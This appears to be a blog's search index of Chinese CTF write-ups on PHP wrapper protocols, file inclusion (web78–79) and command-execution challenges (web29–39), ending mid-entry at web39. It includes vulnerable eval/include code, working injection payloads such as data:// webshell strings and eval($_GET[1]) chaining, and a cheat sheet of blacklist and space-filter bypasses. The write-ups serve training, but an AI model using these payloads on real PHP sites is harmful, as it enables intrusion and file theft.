<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>php伪协议🥰</title>
    <link href="/2023/04/20/phpweixieyi/"/>
    <url>/2023/04/20/phpweixieyi/</url>
    
    <content type="html"><![CDATA[<p>php伪协议是ctf中的一个考点，目前比较熟悉的伪协议有php:&#x2F;&#x2F;filter,php:&#x2F;&#x2F;input,data:&#x2F;&#x2F;text&#x2F;plain,file:&#x2F;&#x2F;。<br>要成功应用伪协议需要php.ini文件的<strong>allow_url_fopen 默认开启</strong>       <strong>allow_url_include 默认关闭</strong></p><h2 id="file-x2F-x2F-伪协议"><a href="#file-x2F-x2F-伪协议" class="headerlink" title="file:&#x2F;&#x2F;伪协议"></a>file:&#x2F;&#x2F;伪协议</h2><p>此协议可以在双off的情况下使用，用于访问本地文件<br>使用方法：<br>file:&#x2F;&#x2F;文件绝对路径和文件名 如<a href="http://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt">http://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt</a></p><h2 id="data-x2F-x2F-text-x2F-plain协议"><a href="#data-x2F-x2F-text-x2F-plain协议" class="headerlink" title="data:&#x2F;&#x2F;text&#x2F;plain协议"></a>data:&#x2F;&#x2F;text&#x2F;plain协议</h2><p>此协议需要在双on的情况下才能使用，很常用的数据流构造器，将读取后面base编码字符串后解码的数据作为数据流的输入<br>使用方法：<br>data:&#x2F;&#x2F;text&#x2F;plain;base64,base64编码字符  如<a href="http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=">http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</a></p><p>　　　　　data:&#x2F;&#x2F;text&#x2F;plain,字符   如<a href="http://127.0.0.1/cmd.php?file=data://text/plain">http://127.0.0.1/cmd.php?file=data://text/plain</a>,<?php phpinfo()?></p><h2 id="php-input协议"><a href="#php-input协议" class="headerlink" title="php:input协议"></a>php:input协议</h2><p>此协议余姚allow_url_include为on，可以访问请求的原始数据的只读流，将post球球的数据作为php代码执行。当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。<br>使用方法：php:&#x2F;&#x2F;input,然后post需要执行的数据 如<a href="http://127.0.0.1/cmd.php?file=php://input">http://127.0.0.1/cmd.php?file=php://input</a>    然后在post中<?php phpinfo() ?><br><img src="/images/hhh.png"></p><h2 id="php-x2F-x2F-filter协议"><a href="#php-x2F-x2F-filter协议" class="headerlink" title="php:&#x2F;&#x2F;filter协议"></a>php:&#x2F;&#x2F;filter协议</h2><p>在双off的情况下也可使用，读取文件并进行显示或写入</p><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>resource&#x3D;&lt;要过滤的数据流&gt;</td><td>这个参数是必须的，它指定了你要筛选过滤的数据流。</td></tr><tr><td>read&#x3D;&lt;读链的筛选列表&gt;</td><td>该参数可选。可以设定一个或多个过滤器名称，以管道符(</td></tr><tr><td>write&#x3D;&lt;写链的筛选列表&gt;</td><td>write&#x3D;&lt;写链的筛选列表&gt;</td></tr><tr><td>&lt;；两个链的筛选列表&gt;</td><td>任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table><p>使用方法：<br>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;文件名(对文件进行base64编码并读取显示)  如：<br><a href="http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=./cmd.php">http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=./cmd.php</a> </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>web入门：文件包含🥰</title>
    <link href="/2023/04/20/wenjianbaohan/"/>
    <url>/2023/04/20/wenjianbaohan/</url>
    
    <content type="html"><![CDATA[<h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>include包含，尝试使用伪协议</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p>使用base64解码获得flag</p><h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> = <span class="hljs-symbol">$</span>_GET[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> = str_replace(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>    include(<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>str_replace()函数把php替换成了???<br>使用data协议：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=data:<span class="hljs-regexp">//</span>text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=<br></code></pre></td></tr></table></figure><p><strong>PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x3D;  —&gt;&lt;?php system(‘cat flag.php’);</strong></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>命令执行绕过小技巧</title>
    <link href="/2023/04/19/minlinzhixinraoguo/"/>
    <url>/2023/04/19/minlinzhixinraoguo/</url>
    
    <content type="html"><![CDATA[<h2 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h2><h4 id="windows-下："><a href="#windows-下：" class="headerlink" title="windows 下："></a>windows 下：</h4><blockquote><ul><li><strong>|</strong> 直接执行后面的语句</li><li><strong>||</strong> 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</li><li><strong>&amp;</strong> 前面和后面命令都要执行，无论前面真假</li><li><strong>&amp;&amp;</strong> 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</li></ul></blockquote><h4 id="Linux-下："><a href="#Linux-下：" class="headerlink" title="Linux 下："></a>Linux 下：</h4><blockquote><ul><li><strong>;</strong> 前面和后面命令都要执行，无论前面真假</li><li><strong>|</strong> 直接执行后面的语句</li><li><strong>||</strong> 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</li><li><strong>&amp;</strong> 前面和后面命令都要执行，无论前面真假</li><li><strong>&amp;&amp;</strong> 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</li></ul></blockquote><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><ul><li><strong>&gt;</strong> &lt; &lt;&gt; 重定向符</li><li>%09(需要php环境)</li><li>${IFS}</li><li>$IFS$9</li><li>{cat,flag.php} &#x2F;&#x2F;用逗号实现了空格功能</li><li>%20</li><li>%09</li></ul><h2 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h2><blockquote><ul><li>system()</li><li>passthru()</li><li>exec()</li><li>shell_exec()</li><li>popen()</li><li>proc_open()</li><li>pcntl_exec()</li><li>反引号 同shell_exec()</li></ul></blockquote><h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><h4 id="拼接"><a href="#拼接" class="headerlink" title="拼接"></a>拼接</h4><blockquote><p>a&#x3D;c;b&#x3D;at;c&#x3D;fl;d&#x3D;ag;$a$b $c$d</p></blockquote><h4 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h4><blockquote><p>echo “Y2F0IGZsYWc&#x3D;”|base64 -d<br>echo “Y2F0IGZsYWc&#x3D;”|base64 -d|bash (在bash被过滤的情况下可尝试sh)</p></blockquote><h4 id="单引号、双引号"><a href="#单引号、双引号" class="headerlink" title="单引号、双引号"></a>单引号、双引号</h4><blockquote><p>c””at fl’’ag</p></blockquote><h4 id="反斜线"><a href="#反斜线" class="headerlink" title="反斜线"></a>反斜线</h4><blockquote><p>c\at fl\ag</p></blockquote><h4 id="正则-假设-x2F-bin-x2F-cat-test-是一个目录"><a href="#正则-假设-x2F-bin-x2F-cat-test-是一个目录" class="headerlink" title="正则 (假设&#x2F;bin&#x2F;cat: test: 是一个目录)"></a>正则 (假设&#x2F;bin&#x2F;cat: test: 是一个目录)</h4><blockquote><p>&#x2F;???&#x2F;?[a][t] ?’’?’’?’’?’’<br>&#x2F;???&#x2F;?at ????<br>&#x2F;???&#x2F;?[a]’’[t] ?’’?’’?’’?’’</p></blockquote><h4 id="1、-2等和"><a href="#1、-2等和" class="headerlink" title="$1、$2等和$@"></a>$1、$2等和$@</h4><blockquote><ul><li>$# 是传给脚本的参数个数</li><li>$0 是脚本本身的名字</li><li>$1 是传递给该shell脚本的第一个参数</li><li>$2 是传递给该shell脚本的第二个参数</li><li>$@ 是传给脚本的所有参数的列表</li><li>$* 是以一个单字符串显示所有向脚本传递的参数，与位置变量不同，参数可超过9个</li><li>$$ 是脚本运行的当前进程ID号</li><li>$? 是显示最后命令的退出状态，0表示没有错误，其他表示有错误</li></ul></blockquote><h2 id="cat被过滤"><a href="#cat被过滤" class="headerlink" title="cat被过滤"></a>cat被过滤</h2><blockquote><p>more:一页一页的显示档案内容<br>less:与 more 类似<br>head:查看头几行<br>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>tail:查看尾几行<br>nl：显示的时候，顺便输出行号<br>od:以二进制的方式读取档案内容<br>vi:一种编辑器，这个也可以查看<br>vim:一种编辑器，这个也可以查看<br>sort:可以查看<br>uniq:可以查看<br>file -f:报错出具体内容</p></blockquote><h2 id="内敛执行"><a href="#内敛执行" class="headerlink" title="内敛执行"></a>内敛执行</h2><blockquote><p>cat$IFS$9<code>ls</code><br>cat$IFS$9$(ls)</p></blockquote><p>(内联，就是将&#96;&#96;或$()内命令的输出作为输入执行)</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>web入门:命令执行🫠</title>
    <link href="/2023/04/19/minlinzhixin/"/>
    <url>/2023/04/19/minlinzhixin/</url>
    
    <content type="html"><![CDATA[<h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>      <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>  &#125;<br>  <br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>  &#125;<br><br></code></pre></td></tr></table></figure><p>preg_match函数是进行<a href="https://blog.csdn.net/l1028386804/article/details/116778918?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168190228216800192231163%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=168190228216800192231163&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-116778918-null-null.142%5Ev85%5Epc_search_v2,239%5Ev2%5Einsert_chatgpt&utm_term=%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F&spm=1018.2226.3001.4187">正则表达式</a>的匹配，成功返回1，否则返回0。<br>在这个正则里边有一个参数是i，这个在正则表达式里边是不区分大小写的一个参数</p><p>查看目录</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>获取flag.php ，关键字flag过滤，使用通配符？</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;cat fla?.php&quot;</span>);<br></code></pre></td></tr></table></figure><p>ctrl+u查看源码</p><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>cp命令将flag.php保存到1.txt 再去访问1.txt</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;cp fla?.php 1.txt&quot;</span>);<br></code></pre></td></tr></table></figure><p>接着在url后输入1.txt就可以看到flag了</p><h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>存源代码中我们可以看出这次过滤了flag，system，php<br>所以这里我们可以用’’来代替system()，这里的&#96;是tab上面的反斜号</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">?c=`cp fla?.p?? <span class="hljs-number">1</span>.txt`;<br></code></pre></td></tr></table></figure><p>在url后输入1.txt查看获得flag</p><h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><p>从源代码可以看出，这题还过滤了cat和空格</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以用eval( )来操作， 这个1已经不属于c的内容了，所以不受过滤管控了，</p><p>得到空白页面右击看源码才能得到flag</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?c=<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-number">1</span>]);&amp;<span class="hljs-number">1</span>=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><p> 将cat 换成 tac 就可以直接看到flag,(tac 是 cat 的反向显示),cat也可以直接看到</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?c=<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-number">1</span>]);&amp;<span class="hljs-number">1</span>=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tac flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>根据源代码可知，反引号，分号，括号都不能用<br>没有括号就不能使用上一题的eval(),所以要用没有括号的函数，比如include<br>分号可以用？&gt;代替<br>还需要配合使用<strong>伪协议</strong>，通过特定的通道读取文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?c=include<span class="hljs-variable">$_GET</span>[a]?&gt;&amp;a=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p>这里我们获得了一个base64的数据<img src="/images/666.png" alt="base64"></p><p><a href="https://c.runoob.com/front-end/693/">base64解码</a></p><p>获得flag！</p><h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>多过滤了一个”<br>使用上一题的方法一样可以做出来</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?c=include<span class="hljs-variable">$_GET</span>[a]?&gt;&amp;a=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p>同样的base64加密，解码获得flag</p><h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>多过滤了一个冒号，也不影响我们使用上面的方法</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?c=include<span class="hljs-variable">$_GET</span>[a]?&gt;&amp;a=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><p>代码懒得帖了<br>ps:此处多过滤了&lt;&#x3D;，与上题题解一样</p><h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><p>代码懒得贴了，和前几题类似<br>ps:此处过滤了数字</p><h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>通过data:&#x2F;&#x2F;text&#x2F;plain协议来进行漏洞利用</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?c=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat fla?.php&quot;</span>);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>ctrl+u以获得flag!</p><h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|php|file/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>比上一题多过滤了php，file<br>使用上一题的方法就行，需要把php换成&#x3D; 即<?=内容?></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/<span class="hljs-string">?c</span>=<span class="hljs-symbol">data:</span>/<span class="hljs-regexp">/text/plains</span>,&lt;<span class="hljs-string">?=</span> system(<span class="hljs-string">&quot;cat fla?.ph?&quot;</span>);<span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>加了个后缀.php，但还是不影响用data协议</p><figure class="highlight 